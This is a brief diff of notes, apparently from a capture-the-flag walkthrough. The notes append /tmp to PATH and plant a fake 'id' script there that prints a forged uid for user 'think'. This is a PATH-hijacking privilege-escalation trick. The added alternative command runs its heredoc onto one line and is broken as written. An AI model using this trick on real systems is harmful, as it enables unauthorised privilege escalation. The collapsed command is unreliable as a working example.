@@ -643,5 +643,7 @@ export PATH=$PATH:/tmp && echo $PATH
 create /tmp/id with uid=33 etc content
 echo "uid=33(www-data) gid=33(www-data) groups=33(www-data)" > /tmp/id
 *supposed to be echo "uid=33(think) gid=33(think) groups=33(think)" > /tmp/id
-echo '#! /bin/bash' > /tmp/id
-echo 'uid=33(think) gid=33(think) groups=33(think)' >> /tmp/id
+echo '#! /bin/bash' > /tmp/id 
+echo 'uid=33(think) gid=33(think) groups=33(think)' >> /tmp/id 
+OR
+rm -f /tmp/id cat > /tmp/id << 'EOF' #!/bin/bash echo "uid=33(think) gid=33(think) groups=33(think)" EOF chmod +x /tmp/id ls -l /tmp/id
